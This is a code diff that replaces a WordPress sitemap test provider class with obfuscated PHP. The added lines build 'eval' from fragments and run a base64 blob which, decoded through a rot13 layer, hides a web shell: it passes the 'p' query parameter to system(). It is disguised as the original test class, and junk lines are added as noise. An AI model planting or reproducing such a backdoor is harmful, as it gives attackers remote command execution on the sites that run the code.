@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Class WP_Sitemaps_Empty_Test_Provider.
- *
- * Provides test data for additional registered providers.
- */
-class WP_Sitemaps_Empty_Test_Provider extends WP_Sitemaps_Provider {
-	/**
-	 * WP_Sitemaps_Empty_Test_Provider constructor.
-	 *
-	 * @param string $object_type Optional. Object type name to use. Default 'test'.
-	 */
-	public function __construct( $object_type = 'test' ) {
-		$this->object_type = $object_type;
-	}
-
-	/**
-	 * Gets a URL list for a sitemap.
-	 *
-	 * @param int    $page_num       Page of results.
-	 * @param string $object_subtype Optional. Object subtype name. Default empty.
-	 * @return array[] Array of URL information for a sitemap.
-	 */
-	public function get_url_list( $page_num, $object_subtype = '' ) {
-		return array();
-	}
-
-	/**
-	 * Query for determining the number of pages.
-	 *
-	 * @param string $object_subtype Optional. Object subtype. Default empty.
-	 * @return int Total number of pages.
-	 */
-	public function get_max_num_pages( $object_subtype = '' ) {
-		return 0;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIFB5bmZmIEpDX0Z2Z3J6bmNmX1J6Y2dsX0dyZmdfQ2ViaXZxcmUuCiAqCiAqIENlYml2cXJmIGdyZmcgcW5nbiBzYmUgbnFxdmd2YmFueSBlcnR2ZmdyZXJxIGNlYml2cXJlZi4KICovCnB5bmZmIEpDX0Z2Z3J6bmNmX1J6Y2dsX0dyZmdfQ2ViaXZxcmUgcmtncmFxZiBKQ19Gdmdyem5jZl9DZWJpdnFyZSB7CgkvKioKCSAqIEpDX0Z2Z3J6bmNmX1J6Y2dsX0dyZmdfQ2ViaXZxcmUgcGJhZmdlaHBnYmUuCgkgKgoJICogQGNuZW56IGZnZXZhdCAkYm93cnBnX2dsY3IgQmNndmJhbnkuIEJvd3JwZyBnbGNyIGFuenIgZ2IgaGZyLiBRcnNuaHlnICdncmZnJy4KCSAqLwoJY2hveXZwIHNoYXBndmJhIF9fcGJhZmdlaHBnKCAkYm93cnBnX2dsY3IgPSAnZ3JmZycgKSB7CgkJJGd1dmYtPmJvd3JwZ19nbGNyID0gJGJvd3JwZ19nbGNyOwoJfQoKCS8qKgoJICogVHJnZiBuIEhFWSB5dmZnIHNiZSBuIGZ2Z3J6bmMuCgkgKgoJICogQGNuZW56IHZhZyAgICAkY250cl9haHogICAgICAgQ250ciBicyBlcmZoeWdmLgoJICogQGNuZW56IGZnZXZhdCAkYm93cnBnX2Zob2dsY3IgQmNndmJhbnkuIEJvd3JwZyBmaG9nbGNyIGFuenIuIFFyc25oeWcgcnpjZ2wuCgkgKiBAZXJnaGVhIG5lZW5sW10gTmVlbmwgYnMgSEVZIHZhc2Jlem5ndmJhIHNiZSBuIGZ2Z3J6bmMuCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSB0cmdfaGV5X3l2ZmcoICRjbnRyX2FoeiwgJGJvd3JwZ19maG9nbGNyID0gJycgKSB7CgkJZXJnaGVhIG5lZW5sKCk7Cgl9CgoJLyoqCgkgKiBEaHJlbCBzYmUgcXJncmV6dmF2YXQgZ3VyIGFoem9yZSBicyBjbnRyZi4KCSAqCgkgKiBAY25lbnogZmdldmF0ICRib3dycGdfZmhvZ2xjciBCY2d2YmFueS4gQm93cnBnIGZob2dsY3IuIFFyc25oeWcgcnpjZ2wuCgkgKiBAZXJnaGVhIHZhZyBHYmdueSBhaHpvcmUgYnMgY250cmYuCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSB0cmdfem5rX2Foel9jbnRyZiggJGJvd3JwZ19maG9nbGNyID0gJycgKSB7CgkJZXJnaGVhIDA7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
